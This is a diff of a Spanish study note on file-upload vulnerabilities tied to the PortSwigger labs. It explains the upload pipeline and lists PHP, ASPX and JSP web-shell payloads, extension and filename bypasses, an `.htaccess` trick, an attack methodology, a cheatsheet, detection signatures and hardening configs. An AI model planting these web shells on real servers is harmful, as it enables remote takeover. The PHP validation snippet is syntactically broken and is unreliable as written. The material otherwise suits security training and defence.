@@ -1,24 +1,114 @@
 ---
-aliases: ["File Upload Vulnerabilities", "Web Shell Upload"]
+aliases: ["File Upload Vulnerabilities", "Web Shell Upload", "Abuso de Subida de Archivos"]
 tags:
-  - hacking/web
-  - hacking/explotacion
-  - hacking/laboratorios
-  - herramientas/burpsuite
-estado: 🟢 Terminado
+  - sec/web
+  - sec/web/upload
+tipo: concepto
+estado: terminado
+creado: 2026-10-11
+actualizado: 2026-10-11
+relacionado:
+  - "[[Local File Inclusion]]"
+  - "[[Path Traversal]]"
+  - "[[OS Command Injection]]"
+  - "[[Log Poisoning]]"
+  - "[[Condiciones de Carrera]]"
+fuente: "https://portswigger.net/web-security/file-upload"
 ---
+
+# Abuso de Subida de Archivos
+
 El abuso de subida de archivos es un tipo de ataque que se produce cuando un atacante aprovecha las vulnerabilidades en las aplicaciones web que permiten a los usuarios **cargar archivos** en el servidor. Este tipo de ataque se conoce comúnmente como un ataque de “**subida de archivos maliciosos**“.
 
-En un ataque de subida de archivos maliciosos, un atacante carga un archivo malicioso en una aplicación web, que luego se almacena en el servidor. Si, por ejemplo, el atacante consigue subir un archivo PHP y el servidor web lo almacena, podría conseguir ejecución remota de comandos y tomar el control del servidor.
+En un ataque de subida de archivos maliciosos, un atacante carga un archivo malicioso en una aplicación web, que luego se almacena en el servidor. Si, por ejemplo, el atacante consigue subir un archivo PHP y el servidor web lo almacena **y lo sirve desde un contexto donde se interpreta**, conseguirá ejecución remota de comandos (web shell) y tomará el control del servidor.
 
 Los atacantes también pueden utilizar técnicas de “**falsificación de tipos de archivos**” (MIME type spoofing) para engañar a una aplicación web con el objetivo de que acepte un archivo malicioso como si fuera un archivo legítimo.
-
-En esta clase, exploraremos algunas de las técnicas más utilizadas para explotar la fase de subida de archivos en aplicaciones web. Aprenderás cómo los atacantes pueden cargar contenido malicioso, además de eludir diferentes restricciones implementadas para lograrlo.
 
 > [!info]
 > Las vulnerabilidades de subida de archivos pueden tener un impacto severo, desde la defacement del sitio web hasta la ejecución remota de código (RCE), lo que permite al atacante tomar el control total del servidor. La clave para la explotación a menudo reside en la validación inadecuada del lado del servidor de la extensión, el tipo MIME, el tamaño o el contenido del archivo.
 
-## PortSwigger
+## Mecánica: el pipeline de subida y dónde se rompe
+
+Toda funcionalidad de upload sigue (implícita o explícitamente) este flujo — cada eslabón es un control que el atacante debe saltar y que el defensor debe endurecer:
+
+```
+1. Recepción multipart   →  2. Validación  →  3. Almacenamiento  →  4. Naming  →  5. Servido/ejecución
+   (cabeceras, nombre)       (extensión,       (ruta, permisos)      (nombre       (¿el webserver
+                              MIME, magic)                          final)         interpreta el tipo?)
+```
+
+| Eslabón | Control defensivo | Bypass atacante |
+|---|---|---|
+| Validación de extensión | Blocklist (`.php`) | Extensiones alternativas, mayúsculas, doble extensión, `.htaccess` |
+| Validación de extensión | Allowlist (`.jpg`) | Políglotos que son imagen Y código |
+| Cabecera `Content-Type` | Comparar con `image/jpeg` | Spoofing trivial del multipart (`Content-Type: image/jpeg` en la petición) |
+| Magic bytes | Leer cabecera del fichero | Prepend `GIF89a`/`\xFF\xD8\xFF` + código |
+| Re-encode/validación de imagen | `imagecreatefrom*` | — (el re-encode **sí** destruye payloads incrustados en metadatos) |
+| Nombre y ruta | Forzar extensión, aleatorizar | `../` en filename, null byte legacy, Windows trailing dot/space |
+| Contexto de servido | Webroot con ejecución deshabilitada | Escapar del directorio de uploads (`../`) a un directorio ejecutable |
+| Procesado posterior | Validar tras mover | Condición de carrera (validar vs. ejecutar en ventanas distintas) |
+
+> [!warning] La pregunta que decide el impacto
+> Subir el archivo es solo la mitad: **¿el servidor lo sirve desde un contexto donde ejecuta?** Un PHP en un directorio de uploads de un Apache con PHP habilitado = RCE. El mismo fichero servido por un nginx que solo `static_file` = inofensivo. Si no ejecuta en `/uploads/`, busca combinar con [[Local File Inclusion]] o [[Path Traversal]] para alcanzar un contexto ejecutable.
+
+## Catálogo de payloads
+
+### Web shells PHP por contexto
+
+| Contexto | Payload |
+|---|---|
+| PHP con tags cortos | `<?=`system($_GET['cmd']);?>` |
+| PHP sin `<?php` permitido | `GIF89a\n<?php system($_GET['cmd']); ?>` (prepend magic GIF) |
+| PHP minúsculo ofuscado | `<?php eval($_POST['x']);?>` |
+| Subida a imagen + LFI | `<?php system($_GET['cmd']); ?>` dentro de Comment EXIF vía `exiftool -Comment='...' img.jpg` |
+| Windows ASPX | `<%@ Page Language="C#" %> <% System.Diagnostics.Process.Start("cmd.exe","/c "+Request["c"]); %>` |
+| JSP | `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>` |
+
+### Extensiones alternativas de PHP (blacklists)
+
+| Servidor | Extensiones que suelen ejecutar |
+|---|---|
+| Apache + mod_php | `.php .php3 .php4 .php5 .php7 .php8 .phtml .pht .phar .phps` |
+| Apache con `.htaccess` permitido | cualquier extensión tras `AddType application/x-httpd-php .xyz` |
+| Nginx + php-fpm (mal configurado) | `.php` vía `location ~ \.php$` — probar `file.php.` (dot final), `file.php%00.jpg` legacy, `file.php/anything` |
+| Nginx + PATH_INFO mal configurado | `/uploads/shell.jpg/x.php` |
+| Windows IIS | `.asp .aspx .asa .cer .cdx` |
+
+### Variaciones de nombre
+
+| Variante | Evasión |
+|---|---|
+| `shell.pHp` | Blocklist case-sensitive |
+| `shell.php.` / `shell.php ` | Windows elimina trailing dot/space |
+| `shell.php.jpg` | Doble extensión (solo peligroso con parsers por número de punto) |
+| `shell.php%00.jpg` | Null byte legacy (PHP < 5.3.4) |
+| `shell.jpg/.` o rutas raras | Trucos de normalización de path |
+| `../shell.php` en `filename` | Salta el directorio de uploads (lab "via path traversal") |
+
+## Metodología de ataque
+
+1. **Subir benigno** y capturar el multipart en Burp: observar campo, extensión forzada, cabeceras, respuesta con la ruta final (devuelven la URL de la imagen = el storage path regalado).
+2. **Identificar el eslabón débil** en orden: Content-Type → extensión (blacklist de mensajes de error) → magic bytes → nombre de archivo.
+3. **Iterar payloads** por la tabla anterior; cada rechazo del servidor es información (¿qué rechazó exactamente? el mensaje de error te dice la capa).
+4. **Localizar la URL servida**: `/avatar/x.php`, inspección del `<img src>`, fuzzing de rutas comunes (`/uploads/`, `/files/`, `/images/`) con [[Nmap Guía Completa]] / ffuf / Burp Scanner (ver [[Burp Suite Escaneo Dirigido y Estructuras de Datos No Estándar]]).
+5. **Ejecutar**: `?cmd=id` sobre la shell y confirmar; si no ejecuta, plantear LFI/[[OS Command Injection]] en otras funciones.
+6. **Carrera**: si hay retardo tras subir (validación lenta), probar la doble petición (upload + request a la ruta) en paralelo — Burp Repeater con *group of parallel requests* o Turbo Intruder (ver [[Condiciones de Carrera]]).
+
+## Detección (defensor)
+- Logs del reverse proxy con multipart que cambia `Content-Type` respecto al sufijo del filename.
+- Archivos con extensión ejecutable o `.htaccess` en directorios de media.
+- Ficheros recién creados con `<?php`/`<%` incrustados (`grep -r` sobre el árbol de uploads).
+- Retardo + borrado repentino = pipeline de validación con ventana explotable.
+- WAF: firmas sobre `<?php`, `<%`, `eval(`, `AddType` en bodies multipart — evadibles, son capa, no control.
+
+## Impacto
+
+1. **Web shell → RCE**: lectura del fichero solicitado (los labs piden `secret`), reverse shell, escalada, movimiento lateral. La cadena completa: upload → shell → `cat /etc/shadow`/flags → persistencia.
+2. **XSS almacenado** si la "imagen" se sirve con `Content-Type` controlable y se abre directamente.
+3. **DoS** (zip bombs, imágenes gigantes) o **XXE** si el servidor procesa SVG/XML subidos.
+4. **Supply chain interno**: `.htaccess` o configs subidas reconfiguran el directorio.
+
+## Laboratorios PortSwigger
 
 ### Lab: Remote code execution via web shell upload
 
@@ -279,3 +369,103 @@ Laboratorio terminado.
 
 > [!warning]
 > Las *condiciones de carrera* (Race Conditions) en la subida de archivos ocurren cuando hay una ventana de tiempo entre la validación de un archivo y su procesamiento o eliminación. Un atacante puede explotar esta ventana subiendo un archivo malicioso, y antes de que la validación lo elimine, realizar una segunda petición para ejecutarlo. Herramientas como Burp Suite Intruder o Turbo Intruder son ideales para automatizar y acelerar estas peticiones, aumentando las posibilidades de éxito. Las mitigaciones incluyen el uso de operaciones atómicas, el bloqueo de archivos o el procesamiento de archivos en un entorno aislado antes de moverlos a una ubicación accesible públicamente.
+
+## Prevención (con código)
+
+La defensa correcta combina **allowlist de extensión + validación de contenido + aislamiento del contexto de servido**:
+
+```php
+// PHP: validación robusta de upload
+$allowed = ['jpg' => 'image/jpeg', 'png' => 'image/png'];
+$ext = strtolower(pathinfo($_FILES['avatar']['name'], 'PATHINFO_EXTENSION']);
+if (!isset($allowed[$ext])) die('extensión no permitida');
+
+// 1) MIME real via finfo (no el Content-Type del cliente)
+$finfo = new finfo(FILEINFO_MIME_TYPE);
+if ($finfo->file($_FILES['avatar']['tmp_name']) !== $allowed[$ext]) die('tipo real no coincide');
+
+// 2) Que de verdad sea una imagen válida
+if (@getimagesize($_FILES['avatar']['tmp_name']) === false) die('imagen inválida');
+
+// 3) Re-codificar: destruye payloads incrustados en metadatos/políglotos
+$img = imagecreatefromjpeg($_FILES['avatar']['tmp_name']);
+imagejpeg($img, '/var/www/uploads/' . bin2hex(random_bytes(16)) . '.jpg');
+```
+
+```nginx
+# Nginx: los uploads NUNCA se ejecutan (directorio separado sin FastCGI)
+location /uploads/ {
+    root /var/www;
+    location ~ \.php$ { deny all; }      # o: return 403;
+    add_header Content-Disposition attachment;  # forzar descarga en binarios
+}
+```
+
+```apache
+# Apache: deshabilitar ejecución y overrides en el directorio de uploads
+<Directory /var/www/uploads>
+    php_admin_flag engine off
+    AllowOverride None
+    Options -ExecCGI
+</Directory>
+```
+
+Reglas de diseño:
+- **Allowlist, nunca blocklist** de extensiones; validar la extensión **final** tras normalizar el nombre.
+- Nombre aleatorio + ruta fuera del webroot si no necesita ser servido; si debe servirse, servir desde CDN/dominio estático sin ejecución.
+- Re-encoding de imágenes con la librería nativa del lenguaje (destruye políglotos y EXIF maliciosos).
+- Antivirus/ClamAV en la cola de subidas para troyanos/bombs, con límite de tamaño y timeout de procesamiento.
+- Nunca confíes en `Content-Type` del cliente ni en la extensión que envía: son datos, no hechos.
+- Subidas a nube (S3): bucket con ejecución deshabilitada y políticas de tipo de contenido; no subir a buckets con funciones Lambda/CloudFront que ejecuten.
+
+## Errores comunes
+
+**Atacante:**
+1. Subir la shell y no verificar el **contexto de servido**: un 200 al cargar la imagen no significa que el PHP se interprete — mirar el contenido devuelto (`<?=` si se ve literal, no ejecutado).
+2. Probar solo `.php` en blacklists: el orden correcto es enumerar mensajes de error para saber QUÉ filtra y saltar con la tabla de extensiones.
+3. Olvidar el Content-Type multipart correcto en Burp (`multipart/form-data; boundary=...`) al editar a mano.
+4. Perseguir la carrera sin medir primero el retardo: si la validación es instantánea, no hay ventana.
+
+**Defensor (falsas soluciones):**
+1. "Filtramos la extensión con `str_replace('.php','')`" — `..pphphp.php` → `.php` (filtro iterativo tonto).
+2. Validar solo la cabecera `Content-Type` del cliente (labs 1 y 2: trivial de saltar).
+3. Blocklist de extensiones sin `.htaccess`/`.user.ini`/`.conf` (lab 3).
+4. Subir a un webroot con ejecución activada "para verlas en la web".
+5. Renombrar pero mantener la extensión peligrosa.
+6. Validar bien pero dejar el archivo con nombre predecible en ruta adivinable (fuerza bruta).
+
+## Cheatsheet
+
+| Bypass | Payload clave |
+|---|---|
+| Content-Type | Cambiar a `image/jpeg` en el multipart |
+| Extensión alternativa | `.php3 .phtml .phar .php5 .pht` |
+| `.htaccess` | `AddType application/x-httpd-php .stark` |
+| Null byte (legacy) | `shell.php%00.jpg` |
+| Path traversal | `filename="../shell.php"` (URL-encode del `/`) |
+| Magic bytes | `GIF89a` + `<?php ...` |
+| Polígloto EXIF | `exiftool -Comment='<?php system($_GET[1]); ?>' img.jpg` |
+| Carrera | upload + GET a la ruta en paralelo (Turbo Intruder) |
+| Lectura del secreto | `cmd=cat /home/carlos/secret` (según el lab) |
+
+| Señal | Capa vulnerable |
+|---|---|
+| Error "solo imágenes" | Validación de MIME/extensión |
+| Archivo se guarda pero no ejecuta | Contexto de servido |
+| Retardo + borrado | Carrera |
+| `../` en respuesta | Naming sin normalizar |
+
+## Laboratorios y referencias
+
+- PortSwigger Academy — File upload vulnerabilities (todos los labs de arriba): https://portswigger.net/web-security/file-upload
+- OWASP — Unrestricted File Upload: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
+- PHP docs — Fileinfo / getimagesize: https://www.php.net/manual/en/book.fileinfo.php
+- GTFOBins (contexto local, misma mentalidad de "¿dónde ejecuta?"): https://gtfobins.github.io/
+
+## Relacionadas
+
+- [[Local File Inclusion]] — la cadena clásica: subir imagen con PHP + incluirla con `?page=`
+- [[Path Traversal]] — escape del directorio de uploads vía `../` en filename (lab propio arriba)
+- [[OS Command Injection]] — el mismo impacto (RCE) una vez dentro de la shell
+- [[Condiciones de Carrera]] — la técnica del último lab, aplicada al pipeline de validación
+- [[Log Poisoning]] — prima hermana: inyectar código en logs que luego se "cargan" como ficheros
